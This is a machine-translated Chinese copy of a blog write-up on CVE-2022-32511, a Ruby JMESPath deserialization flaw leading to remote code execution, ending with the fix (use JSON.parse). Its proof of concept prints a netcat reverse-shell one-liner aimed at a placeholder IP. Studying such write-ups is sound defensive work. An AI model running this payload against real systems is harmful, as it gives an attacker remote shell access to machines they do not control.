<html>
<head>
<title>CVE-2022–32511 | Exploit | Remote Code Execution</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">CVE-2022–32511 |漏洞利用|远程代码执行</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/cve-2022-32511-exploit-remote-code-execution-daeffdc94219?source=collection_archive---------0-----------------------#2022-06-29">https://infosecwriteups.com/cve-2022-32511-exploit-remote-code-execution-daeffdc94219?source=collection_archive---------0-----------------------#2022-06-29</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><h1 id="18b5" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">描述:</h1><p id="0d8b" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">由于使用了<code class="fe lj lk ll lm b">JSON.load</code>，此软件包的受影响版本容易受到不受信任数据的反序列化的攻击，这在与不受信任的输入一起使用时被认为是不安全的。</p><h1 id="4ce5" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">概念验证</h1><ol class=""><li id="bd0d" class="ln lo iq kn b ko kp ks kt kw lp la lq le lr li ls lt lu lv bi translated">为了重现安装“JMESPath 1.6.0”或之前版本时首先需要的步骤:</li></ol><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div class="gh gi lw"><img src="../Images/cc550287e96a831cf671bc8867ff86c0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1190/format:webp/1*LBLDXBi_-y8hlvR5p-s3Jw.png"/></div></figure><p id="6d61" class="pw-post-body-paragraph kl km iq kn b ko me kq kr ks mf ku kv kw mg ky kz la mh lc ld le mi lg lh li ij bi translated">2.用下面提到的命令导入库火'<strong class="kn ir">交互红宝石外壳'</strong>:</p><pre class="lx ly lz ma gt mj lm mk ml aw mm bi"><span id="93dd" class="mn jo iq lm b gy mo mp l mq mr">irb<!-- --> </span></pre><p id="41c5" class="pw-post-body-paragraph kl km iq kn b ko me kq kr ks mf ku kv kw mg ky kz la mh lc ld le mi lg lh li ij bi translated">3.如果您没有安装“irb ”,请使用以下命令下载:</p><pre class="lx ly lz ma gt mj lm mk ml aw mm bi"><span id="e833" class="mn jo iq lm b gy mo mp l mq mr">gem install irb</span></pre><p id="6c60" class="pw-post-body-paragraph kl km iq kn b ko me kq kr ks mf ku kv kw mg ky kz la mh lc ld le mi lg lh li ij bi translated">4.选择想要的有效载荷，我已经从<a class="ae ms" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" rel="noopener ugc nofollow" target="_blank">按钮</a>中选择了一个</p><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi mt"><img src="../Images/69344b73694e4aa259a327ef71657655.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1xiW2jbKM3MRQj6a3HqF5w.png"/></div></div></figure><pre class="lx ly lz ma gt mj lm mk ml aw mm bi"><span id="087c" class="mn jo iq lm b gy mo mp l mq mr">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 'IP' 1234 &gt;/tmp/f</span></pre><p id="608a" class="pw-post-body-paragraph kl km iq kn b ko me kq kr ks mf ku kv kw mg ky kz la mh lc ld le mi lg lh li ij bi translated">5.最后，导入易受攻击的“JMESPath”库，并提供有效负载来执行反向shell:</p><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi my"><img src="../Images/401f3c4ee50a42dd71e48c9a2907a8fb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*j8noz7FKZoen-TIC6ahYtw.png"/></div></div></figure><h1 id="b82e" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">结论</h1><p id="bda3" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">建议使用<code class="fe lj lk ll lm b">JSON.parse</code>而不是<code class="fe lj lk ll lm b">JSON.load.</code>，在这种情况下，我们观察到<code class="fe lj lk ll lm b">JSON.load</code>无法验证输入数据，从而导致远程代码执行。</p><h1 id="e80b" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">参考</h1><div class="mz na gp gr nb nc"><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-32511" rel="noopener  ugc nofollow" target="_blank"><div class="nd ab fo"><div class="ne ab nf cl cj ng"><h2 class="bd ir gy z fp nh fr fs ni fu fw ip bi translated">NVD</h2><div class="nj l"><h3 class="bd b gy z fp nh fr fs ni fu fw dk translated">自NVD上次分析以来，此漏洞已被修改。正在等待重新分析，这可能会导致…</h3></div><div class="nk l"><p class="bd b dl z fp nh fr fs ni fu fw dk translated">nvd.nist.gov</p></div></div><div class="nl l"><div class="nm l nn no np nl nq mc nc"/></div></div></a></div><div class="mz na gp gr nb nc"><a href="https://security.snyk.io/vuln/SNYK-RUBY-JMESPATH-2859799" rel="noopener  ugc nofollow" target="_blank"><div class="nd ab fo"><div class="ne ab nf cl cj ng"><h2 class="bd ir gy z fp nh fr fs ni fu fw ip bi translated">jmespath | CVE中不可信数据的反序列化-2022-32511 | Snyk</h2><div class="nj l"><h3 class="bd b gy z fp nh fr fs ni fu fw dk translated">您的应用程序使用这个易受攻击的包吗？只需点击几下鼠标，我们就可以分析您的整个应用程序，并了解…</h3></div><div class="nk l"><p class="bd b dl z fp nh fr fs ni fu fw dk translated">security.snyk.io</p></div></div></div></a></div><div class="mz na gp gr nb nc"><a href="https://github.com/jmespath/jmespath.rb/compare/v1.6.0...v1.6.1" rel="noopener  ugc nofollow" target="_blank"><div class="nd ab fo"><div class="ne ab nf cl cj ng"><h2 class="bd ir gy z fp nh fr fs ni fu fw ip bi translated">比较1.6.0版...1.6.1版jme path/jme path . Rb</h2><div class="nj l"><h3 class="bd b gy z fp nh fr fs ni fu fw dk translated">此时您不能执行该操作。您已使用另一个标签页或窗口登录。您已在另一个选项卡中注销，或者…</h3></div><div class="nk l"><p class="bd b dl z fp nh fr fs ni fu fw dk translated">github.com</p></div></div><div class="nl l"><div class="nr l nn no np nl nq mc nc"/></div></div></a></div></div></div>    
</body>
</html>